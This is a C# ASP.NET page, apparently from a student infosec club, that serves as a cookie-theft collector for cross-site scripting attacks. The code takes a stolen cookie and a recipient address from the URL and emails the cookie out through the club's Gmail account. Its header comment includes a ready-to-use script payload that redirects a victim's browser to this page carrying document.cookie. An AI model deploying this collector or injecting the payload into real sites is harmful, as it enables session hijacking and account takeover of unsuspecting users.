using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Net;
using System.Net.Mail;

using System.Text;
using System.IO;
using System.Collections;
using System.Configuration;


namespace WebApplication5
{
    public partial class XSS : System.Web.UI.Page
    {
        /*
         * Takes a string from the URL and sends it to the corresponding email address. To be used for XSS attacks where only only needs to change cookie value and do a simple redirect
         * Example use case http://sjsuinfosec.com/XSS.aspx?cookie=ddwasd&email=vivi.langga@gmail.com
         * @param cookie the cookie to insert
         * @param the email to send to
         * XSS Sample:
         * <SCRIPT> document.location='http://sjsuinfosec.com/XSS.aspx?cookie=' +document.cookie + '&email=yourEmail@gmail.com'; </SCRIPT>
        */
        protected void Page_Load(object sender, EventArgs e)
        {

            try
            {
                //GETS COOKIE FROM POST METHOD
                String cookie = Request.QueryString["cookie"];
                String email = Request.QueryString["email"];
                //GETS COOKIE FROM GET METHOD
                string test = ConfigurationManager.AppSettings["clubEmail"];
                var fromAddress = new MailAddress(test, "InfoSec Club");
                var toAddress = new MailAddress(email, "");
                string fromPassword = ConfigurationManager.AppSettings["clubEmailPass"];
                string subject = "XSS Attack";
                string body = "The cookie is: " + cookie;
                var smtp = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                };
                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject,
                    Body = body
                })
                {
                    smtp.Send(message);
                }
            }
            catch (Exception ex)
            {
                Response.Redirect("/Error.aspx");
            }




        }
    }
}